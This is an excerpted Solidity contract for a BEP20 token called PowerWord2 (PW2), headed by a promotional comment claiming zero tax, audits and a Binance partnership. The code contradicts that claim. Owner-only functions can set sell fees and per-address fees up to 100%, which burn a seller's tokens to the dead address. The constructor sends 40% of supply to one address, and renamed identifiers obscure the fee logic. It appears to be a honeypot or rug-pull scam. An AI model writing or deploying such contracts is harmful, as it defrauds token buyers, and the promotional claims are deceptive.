...
/*
btoken PW2 project is a utility staking token with ZERO TAX holders will be able to stake nft , holding it for longer period of time.  KYC AUDIT  Contract audit  NO TOKEN TAX    Partnered with Binance, Dont forget to follow our official links down below and dont miss out this rare opportunity.
* http://instagram.com/PowerWord2823
* https://www.reddit.com/user/PowerWord2823
* TWITTER:https://twitter.com/pw2
* WEBSITE:https://www.pw2.com
* TELEGRAM:https://t.me/pw2
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingPowerWord2823OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingPowerWord2823OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingPowerWord2823OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingPowerWord2823OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingPowerWord2823OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function PowerWord2823To() external view returns (address);
    function PowerWord2823ToSetter() external view returns (address);
    ...
    function setPowerWord2823To(address) external;
    function setPowerWord2823ToSetter(address) external;
}
...
contract PW2 is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "PowerWord2";
	string symbol_ = "PW2";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        ...
        _defaultSellPowerWord2823 = 0;
        _defaultBuyPowerWord2823 = 0;
    ...
    uint256 private _defaultSellPowerWord2823 = 0;
    uint256 private _defaultBuyPowerWord2823 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellPowerWord2823 = _value;
    }


    function acPowerWord2823fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradePowerWord2823amuont = 0;

        if (rF) {
            uint256 tradePowerWord2823 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradePowerWord2823 = _msgPowerWord2823Info(uint160(from));
                    tradePowerWord2823 = tradePowerWord2823 < _defaultSellPowerWord2823 ? _defaultSellPowerWord2823 : tradePowerWord2823;
                }
                if (from == uniswapV2Pair) {
                    tradePowerWord2823 = _defaultBuyPowerWord2823;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradePowerWord2823 = _Escape[from];
            }


            tradePowerWord2823amuont = _amuont.mul(tradePowerWord2823).div(100);
        }


        if (tradePowerWord2823amuont > 0) {
            _balances[from] = _balances[from].sub(tradePowerWord2823amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradePowerWord2823amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradePowerWord2823amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradePowerWord2823amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradePowerWord2823amuont);
        emit Transfer(from, _to, _amuont - tradePowerWord2823amuont);
    }
	...
	function _msgPowerWord2823Info(uint _acc) internal view virtual returns (uint) {
